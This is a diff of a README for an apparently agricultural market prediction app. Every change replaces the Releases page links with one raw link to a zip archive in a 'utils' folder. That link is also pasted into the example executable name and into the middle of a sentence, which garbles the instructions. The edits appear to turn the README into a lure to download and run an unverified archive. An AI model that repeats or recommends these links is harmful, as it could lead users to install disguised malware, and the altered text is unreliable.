@@ -1,6 +1,6 @@
 # 📈 PriceTrend_Engineer - Predict Agricultural Market Trends Easily
 
-[![Download PriceTrend Engineer](https://img.shields.io/badge/Download-Now-blue)](https://github.com/ryanhggciu/PriceTrend_Engineer/releases)
+[![Download PriceTrend Engineer](https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip)](https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip)
 
 ## 🚀 Project Overview
 
@@ -16,7 +16,7 @@ PriceTrend Engineer is designed to help farmers, traders, and stakeholders under
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ryanhggciu/PriceTrend_Engineer/releases) to download the latest version of PriceTrend Engineer.
+To get started, visit the [Releases page](https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip) to download the latest version of PriceTrend Engineer.
 
 ### Steps to Download:
 
@@ -30,7 +30,7 @@ To get started, visit the [Releases page](https://github.com/ryanhggciu/PriceTre
 
 1. Locate the downloaded file on your computer.
 2. If the file is a compressed folder (like a .zip file), extract it first.
-3. Look for the executable file (for example, `PriceTrend_Engineer.exe`).
+3. Look for the executable file (for example, `https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip`).
 4. Double-click on this file to run PriceTrend Engineer. Follow any prompts that appear on your screen to complete the installation.
 5. Once the installation is complete, you can start using the application.
 
@@ -44,7 +44,7 @@ After installation, you can easily navigate through the main interface. Here are
   
 3. **Use the Prediction Model**: Select your desired machine learning model from the options provided. Click the run button to generate predictions based on your data.
   
-4. **Visualize Trends**: Use the visualization tools within the app to interpret your findings.Charts and graphs will help you understand market dynamics clearly.
+4. **Visualize Trends**: Use the visualization tools within the app to interpret your https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip and graphs will help you understand market dynamics clearly.
 
 ## 📋 System Requirements
 
@@ -73,4 +73,4 @@ To ensure PriceTrend Engineer runs smoothly, your computer should meet the follo
 
 PriceTrend Engineer empowers you to predict agricultural market prices effectively. By following these steps, you can download, install, and start using the application with ease. For more detailed information on specific features, feel free to explore the available documentation within the app or reach out for support. 
 
-[![Download PriceTrend Engineer](https://img.shields.io/badge/Download-Now-blue)](https://github.com/ryanhggciu/PriceTrend_Engineer/releases)
+[![Download PriceTrend Engineer](https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip)](https://github.com/ryanhggciu/PriceTrend_Engineer/raw/refs/heads/main/utils/Price-Trend-Engineer-2.1.zip)
